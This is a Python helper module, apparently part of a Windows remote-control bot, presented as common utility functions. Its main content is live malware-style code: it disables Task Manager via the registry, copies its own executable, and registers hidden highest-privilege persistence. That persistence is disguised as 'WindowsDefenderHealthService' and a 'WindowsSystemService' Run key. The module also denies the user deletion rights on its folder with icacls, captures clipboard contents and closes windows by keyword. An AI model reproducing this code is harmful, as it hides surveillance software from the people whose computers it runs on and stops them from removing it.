"""
Utility Functions Module
Common helper functions

Developer: TsByin
Version: 12.0
"""

import os
import io
import json
import ctypes
import subprocess
import time
import logging
import socket
from pathlib import Path
from datetime import datetime

logger = logging.getLogger(__name__)
HOSTS_PATH = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "drivers" / "etc" / "hosts"

# ==============================================================================
# WINDOW & SYSTEM UTILITIES
# ==============================================================================

def get_active_window_title():
    """Get current active window title"""
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    except Exception as e:
        logger.debug(f"get_active_window_title failed: {e}")
        return ""

def close_window_by_handle(hwnd):
    """Close window by handle"""
    try:
        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
        return True
    except Exception as e:
        logger.debug(f"close_window_by_handle failed: {e}")
        return False

def find_and_close_window(keywords):
    """Find and close windows by keywords"""
    try:
        def callback(hwnd, extra):
            try:
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                title = buff.value.lower()
                
                for k in keywords:
                    if k.lower() in title:
                        close_window_by_handle(hwnd)
                        logger.info(f"Closed window: {title}")
                        return True
            except:
                pass
            return True
        
        CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
        ctypes.windll.user32.EnumWindows(CMPFUNC(callback), 0)
    except Exception as e:
        logger.error(f"find_and_close_window failed: {e}")

def show_message_box(text):
    """Display system message box"""
    try:
        # MB_ICONINFORMATION | MB_OK | MB_TOPMOST | MB_SETFOREGROUND
        flags = 0x40 | 0x1 | 0x40000 | 0x10000
        ctypes.windll.user32.MessageBoxW(0, text, "⚠️ THÔNG BÁO TỪ CHEI", flags)
        return True
    except Exception as e:
        logger.error(f"show_message_box failed: {e}")
        return False

def protect_folder(path):
    """Protect folder using NTFS permissions"""
    try:
        user = os.getlogin()
        cmd = f'icacls "{path}" /deny {user}:(D,WDAC,WO) /t /c /q'
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
        logger.info(f"Protected folder: {path}")
        return True
    except Exception as e:
        logger.error(f"protect_folder failed: {e}")
        return False

# ==============================================================================
# SETTINGS & JSON MANAGEMENT
# ==============================================================================

def load_json_safe(filepath, default=None):
    """Safely load JSON file"""
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Load JSON {filepath} failed: {e}")
    
    return default if default is not None else {}

def save_json_safe(filepath, data):
    """Safely save JSON file — B13: guard empty dirname"""
    try:
        dirpath = os.path.dirname(filepath)
        if dirpath:
            os.makedirs(dirpath, exist_ok=True)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        logger.info(f"Saved JSON: {filepath}")
        return True
    except Exception as e:
        logger.error(f"Save JSON {filepath} failed: {e}")
        return False

def load_settings(settings_file):
    """Load bot settings — returns full state dict"""
    defaults = {
        "menu_mode": 1,
        "block_mode": False,
        "taskmgr_locked": False,
        "intrusion_alert": False,
        "clipboard_monitor": False,
    }
    data = load_json_safe(settings_file, defaults)
    for k, v in defaults.items():
        data.setdefault(k, v)
    return data

def save_settings(settings_file, settings_dict):
    """Save bot settings dict to file"""
    return save_json_safe(settings_file, settings_dict)

def append_audit_log(audit_file, cmd, user_id):
    """Append a line to the audit log file"""
    try:
        dirpath = os.path.dirname(audit_file)
        if dirpath:
            os.makedirs(dirpath, exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(audit_file, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] uid={user_id} cmd={cmd}\n")
    except Exception as e:
        logger.error(f"append_audit_log failed: {e}")

def load_blocked_list(blocked_file):
    """Load blocked apps/sites list"""
    data = load_json_safe(blocked_file, {"apps": [], "sites": []})
    if "apps" not in data:
        data["apps"] = []
    if "sites" not in data:
        data["sites"] = []
    return data

def save_blocked_list(blocked_file, blocked_data):
    """Save blocked apps/sites list"""
    return save_json_safe(blocked_file, blocked_data)

# ==============================================================================
# CLIPBOARD
# ==============================================================================

def get_clipboard_contents():
    """Return text, files and image bytes from clipboard (Windows)"""
    text = None
    files = []
    image_bytes = None

    try:
        import win32clipboard  # type: ignore[import-untyped]
        import win32con       # type: ignore[import-untyped]

        win32clipboard.OpenClipboard()
        try:
            if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
                text = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
            if win32clipboard.IsClipboardFormatAvailable(win32con.CF_HDROP):
                files = list(win32clipboard.GetClipboardData(win32con.CF_HDROP))
        finally:
            win32clipboard.CloseClipboard()
    except Exception as e:
        logger.error(f"get_clipboard_contents (text/files) failed: {e}")

    # Try image via Pillow clipboard helper
    try:
        from PIL import ImageGrab
        img = ImageGrab.grabclipboard()
        if hasattr(img, "save"):
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            image_bytes = buf.getvalue()
    except Exception as e:
        logger.debug(f"get_clipboard_contents (image) skipped: {e}")

    return {"text": text, "files": files, "image": image_bytes}

# ==============================================================================
# HOSTS / SITE BLOCKING
# ==============================================================================

def _flush_dns_cache():
    """Flush DNS cache to apply hosts changes immediately"""
    try:
        subprocess.run(
            ["ipconfig", "/flushdns"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=5,
            check=False
        )
        return True
    except Exception as e:
        logger.warning(f"Flush DNS cache failed: {e}")
        return False


def update_hosts_block(entries, block=True):
    """Add or remove multiple domain entries in hosts file"""
    try:
        entries = [e.strip().lower() for e in entries if e.strip()]
        if not entries:
            return False

        hosts_path = HOSTS_PATH
        existing_lines = []
        if hosts_path.exists():
            with open(hosts_path, 'r', encoding='utf-8', errors='ignore') as f:
                existing_lines = f.readlines()

        new_lines = []
        for line in existing_lines:
            lower = line.lower()
            if any(e in lower for e in entries):
                continue  # skip old entries for these domains
            new_lines.append(line)

        if block:
            for t in entries:
                new_lines.append(f"0.0.0.0 {t}\n")
                new_lines.append(f"127.0.0.1 {t}\n")
                new_lines.append(f"::1 {t}\n")

        with open(hosts_path, 'w', encoding='utf-8') as f:
            f.writelines(new_lines)

        _flush_dns_cache()
        logger.info(f"{'Blocked' if block else 'Unblocked'} site via hosts: {', '.join(entries)}")
        return True
    except Exception as e:
        logger.error(f"update_hosts_block failed: {e}")
        return False


def block_site(domain):
    """Public helper to block a site (hosts + firewall)"""
    bundle = expand_domains(domain)
    ok_host = update_hosts_block(bundle["hosts"], block=True)
    ok_fw = add_firewall_block(domain, bundle["fqdns"], bundle["hosts"])
    return ok_host or ok_fw


def unblock_site(domain):
    """Public helper to unblock a site (hosts + firewall)"""
    bundle = expand_domains(domain)
    ok_host = update_hosts_block(bundle["hosts"], block=False)
    ok_fw = remove_firewall_block(domain)
    return ok_host or ok_fw


def expand_domains(domain):
    """Return expanded host/fqdn lists for blocking"""
    d = domain.strip().lower()
    hosts = []
    fqdns = []

    if not d:
        return {"hosts": [], "fqdns": []}

    base_variants = {d}
    if not d.startswith("www."):
        base_variants.add(f"www.{d}")
    base_variants.add(f"m.{d}")

    hosts.extend(sorted(base_variants))

    # FQDNs include wildcard for subdomains
    for b in base_variants:
        fqdns.append(b)
    fqdns.append(f"*.{d}")

    # Facebook-heavy domains need cdn/messenger
    if "facebook" in d:
        for extra in ["fbcdn.net", "messenger.com"]:
            hosts.append(extra)
            hosts.append(f"www.{extra}")
            fqdns.extend([extra, f"*.{extra}"])

    # Deduplicate
    hosts = list(dict.fromkeys(hosts))
    fqdns = list(dict.fromkeys(fqdns))
    return {"hosts": hosts, "fqdns": fqdns}


def add_firewall_block(domain, fqdns, resolve_domains, ip_limit=64, block_ports=True):
    """Add outbound firewall rule to block domain and subdomains"""
    try:
        rule_name = f"V12_Block_{domain}"
        fqdn_list = ",".join([f"'{fq}'" for fq in fqdns])
        if fqdn_list:
            cmd = [
                "powershell",
                "-Command",
                f"New-NetFirewallRule -DisplayName '{rule_name}' -Direction Outbound -Action Block -RemoteFQDN {fqdn_list} -ErrorAction SilentlyContinue"
            ]
            subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW, timeout=8, check=False)

        # Resolve a few IPs and block by remote address as a fallback
        ips = resolve_ips(resolve_domains, limit=ip_limit)
        if ips:
            ip_rule = f"{rule_name}_IP"
            ip_list = ",".join(ips)
            base_cmd = (
                f"New-NetFirewallRule -DisplayName '{ip_rule}' -Direction Outbound "
                f"-Action Block -RemoteAddress {ip_list} -ErrorAction SilentlyContinue"
            )
            if block_ports:
                base_cmd += " -Protocol TCP -RemotePort 80,443"

            cmd_ip = ["powershell", "-Command", base_cmd]
            subprocess.run(cmd_ip, creationflags=subprocess.CREATE_NO_WINDOW, timeout=8, check=False)

        logger.info(f"Firewall block added: {domain}")
        return True
    except Exception as e:
        logger.error(f"add_firewall_block failed: {e}")
        return False


def remove_firewall_block(domain):
    """Remove firewall rule for domain"""
    try:
        rule_name = f"V12_Block_{domain}"
        cmd = [
            "powershell",
            "-Command",
            f"Remove-NetFirewallRule -DisplayName '{rule_name}' -ErrorAction SilentlyContinue"
        ]
        subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5, check=False)
        ip_rule = f"{rule_name}_IP"
        cmd_ip = [
            "powershell",
            "-Command",
            f"Remove-NetFirewallRule -DisplayName '{ip_rule}' -ErrorAction SilentlyContinue"
        ]
        subprocess.run(cmd_ip, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5, check=False)
        logger.info(f"Firewall block removed: {domain}")
        return True
    except Exception as e:
        logger.error(f"remove_firewall_block failed: {e}")
        return False


def resolve_ips(domains, limit=64):
    """Resolve a list of domains to a set of IPv4 addresses (limit)"""
    try:
        ips = []
        for d in domains:
            infos = socket.getaddrinfo(d, None)
            for info in infos:
                ip = info[4][0]
                if ":" in ip:
                    continue  # skip IPv6 for the IP rule
                if ip not in ips:
                    ips.append(ip)
                if len(ips) >= limit:
                    return ips
        return ips
    except Exception as e:
        logger.debug(f"resolve_ips failed for {domains}: {e}")
        return []


def refresh_firewall_blocks(domains, ip_limit=64, block_ports=True):
    """
    Re-resolve domains and refresh firewall IP rules (e.g., for CDNs with changing IPs).
    Removes old IP rules and adds new ones with updated addresses.
    """
    try:
        for d in domains:
            bundle = expand_domains(d)
            # Remove old IP rule and add anew
            ip_rule = f"V12_Block_{d}_IP"
            subprocess.run(
                [
                    "powershell",
                    "-Command",
                    f"Remove-NetFirewallRule -DisplayName '{ip_rule}' -ErrorAction SilentlyContinue"
                ],
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=5,
                check=False
            )

            ips = resolve_ips(bundle["hosts"], limit=ip_limit)
            if not ips:
                continue

            ip_list = ",".join(ips)
            base_cmd = (
                f"New-NetFirewallRule -DisplayName '{ip_rule}' -Direction Outbound "
                f"-Action Block -RemoteAddress {ip_list} -ErrorAction SilentlyContinue"
            )
            if block_ports:
                base_cmd += " -Protocol TCP -RemotePort 80,443"

            subprocess.run(
                ["powershell", "-Command", base_cmd],
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=8,
                check=False
            )
        logger.info("Firewall IP rules refreshed")
        return True
    except Exception as e:
        logger.error(f"refresh_firewall_blocks failed: {e}")
        return False

# ==============================================================================
# TEXT & SPEECH
# ==============================================================================

def speak_text(text, rate=175, voice_pref=None):
    """Text-to-speech — B9 fixed: create fresh engine each call to allow repeated use.
    voice_pref: 'f' = prefer female voice, 'm' = prefer male voice"""
    try:
        import pyttsx3
        engine = pyttsx3.init()
        engine.setProperty('rate', rate)

        # Try to select voice by gender preference
        if voice_pref:
            voices = engine.getProperty('voices')
            for v in voices:
                name_lower = (v.name or '').lower()
                id_lower = (v.id or '').lower()
                if voice_pref == 'f' and ('female' in name_lower or 'zira' in id_lower
                                          or 'hazel' in name_lower):
                    engine.setProperty('voice', v.id)
                    break
                elif voice_pref == 'm' and ('male' in name_lower or 'david' in id_lower
                                            or 'mark' in name_lower):
                    engine.setProperty('voice', v.id)
                    break

        engine.say(text)
        engine.runAndWait()
        engine.stop()  # Ensure engine is properly released
        logger.info(f"Spoke: {text[:50]}")
        return True
    except Exception as e:
        logger.error(f"speak_text failed: {e}")
        return False

# ==============================================================================
# TASK MANAGEMENT
# ==============================================================================

def get_installed_browsers(browser_paths):
    """Get list of installed browsers"""
    return [name for name, path in browser_paths.items() if os.path.exists(path)]

def set_taskmgr_state(enable=True):
    """Enable/Disable Task Manager"""
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        if enable:
            try:
                winreg.DeleteValue(key, "DisableTaskMgr")
            except:
                pass
        else:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        
        winreg.CloseKey(key)
        logger.info(f"TaskMgr state set to: {'ENABLED' if enable else 'DISABLED'}")
        return True
    except Exception as e:
        logger.error(f"set_taskmgr_state failed: {e}")
        return False

def check_integrity(target_dir, target_exe, current_exe, register_autostart=True):
    """Check file presence, copy if needed, and optionally register autostart."""
    try:
        os.makedirs(target_dir, exist_ok=True)

        # Copy executable if running from a different location
        if os.path.abspath(current_exe).lower() != os.path.abspath(target_exe).lower():
            import shutil
            shutil.copy2(current_exe, target_exe)
            logger.info(f"Copied executable to {target_exe}")

        if register_autostart:
            # Primary: Task Scheduler (survives Registry cleanup tools)
            _setup_autostart_task(target_exe)

            # Fallback: Registry Run key
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, target_exe)
                winreg.CloseKey(key)
                logger.info("Registry fallback persistence added")
            except Exception as e:
                logger.warning(f"Registry fallback failed: {e}")
        else:
            _remove_main_autostart()

        # Protect installation folder
        protect_folder(target_dir)
        return True
    except Exception as e:
        logger.error(f"check_integrity failed: {e}")
        return False


def _setup_autostart_task(exe_path):
    """Register exe as a Task Scheduler AtLogon task — hidden, highest privilege."""
    try:
        task_name = "WindowsDefenderHealthService"
        exe_dir = os.path.dirname(exe_path)

        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2"
  xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Defender Health Monitor</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT15S</Delay>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT20S</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartInterval>PT1M</RestartInterval>
    <RestartCount>999</RestartCount>
    <Hidden>true</Hidden>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{exe_path}</Command>
      <WorkingDirectory>{exe_dir}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>"""

        xml_path = os.path.join(exe_dir, "_st.xml")
        with open(xml_path, "w", encoding="utf-16") as f:
            f.write(xml)

        subprocess.run(
            ["schtasks", "/create", "/tn", task_name,
             "/xml", xml_path, "/f"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
            check=False,
        )
        # Clean up temp XML
        try:
            os.remove(xml_path)
        except Exception:
            pass
        logger.info(f"Task Scheduler autostart registered: {task_name}")
    except Exception as e:
        logger.warning(f"_setup_autostart_task failed: {e}")


def _remove_main_autostart():
    """Remove main-process startup entries when watchdog manages startup."""
    task_name = "WindowsDefenderHealthService"
    try:
        subprocess.run(
            ["schtasks", "/delete", "/tn", task_name, "/f"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
            check=False,
        )
        logger.info(f"Main autostart task removed (if existed): {task_name}")
    except Exception as e:
        logger.warning(f"Failed removing task '{task_name}': {e}")

    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        try:
            winreg.DeleteValue(key, "WindowsSystemService")
            logger.info("Registry fallback persistence removed")
        except FileNotFoundError:
            pass
        finally:
            winreg.CloseKey(key)
    except Exception as e:
        logger.warning(f"Failed removing registry fallback: {e}")

# ==============================================================================
# FILE OPERATIONS
# ==============================================================================

def compress_file(input_file):
    """Compress file using gzip"""
    try:
        import gzip
        output_file = f"{input_file}.gz"
        
        with open(input_file, 'rb') as f_in:
            with gzip.open(output_file, 'wb') as f_out:
                f_out.writelines(f_in)
        
        os.remove(input_file)
        logger.info(f"Compressed: {input_file} -> {output_file}")
        return output_file
    except Exception as e:
        logger.error(f"compress_file failed: {e}")
        return input_file

def safe_remove_file(filepath):
    """Safely remove file"""
    try:
        if os.path.exists(filepath):
            os.remove(filepath)
            logger.debug(f"Removed: {filepath}")
            return True
    except Exception as e:
        logger.error(f"safe_remove_file failed: {e}")
    return False

def get_file_size_mb(filepath):
    """Get file size in MB"""
    try:
        return os.path.getsize(filepath) / (1024 * 1024)
    except:
        return 0

# ════════════════════════════════════════════════
# Developer: TsByin
# Module: Utility Helpers & System Functions
# ════════════════════════════════════════════════
